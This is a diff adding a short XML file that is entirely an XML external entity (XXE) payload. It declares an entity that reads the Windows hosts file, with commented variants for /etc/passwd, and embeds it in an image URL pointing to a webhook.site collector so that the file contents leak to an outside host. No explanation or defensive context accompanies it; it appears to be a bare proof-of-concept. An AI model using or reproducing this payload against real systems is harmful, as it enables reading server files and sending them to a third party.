@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+]>
+<data>
+  <info>
+    <img src="https://webhook.site/b62c68d8-32d5-48ef-924a-3bd6a16cdcdc?leak=&xxe;" />
+  </info>
+</data>
+
+
+<!-- <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> -->
+<!-- <!ENTITY xxe SYSTEM "file:///etc/passwd"> -->
